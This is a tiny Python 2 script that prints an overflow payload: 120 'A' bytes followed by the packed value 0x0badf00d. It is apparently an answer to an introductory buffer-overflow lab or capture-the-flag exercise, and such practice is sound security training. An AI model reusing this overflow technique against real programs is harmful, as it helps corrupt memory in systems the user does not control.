#!/usr/bin/python
import struct

badfood = struct.pack("<I", 0x0badf00d)
s = 'A' * 120 + badfood

print s
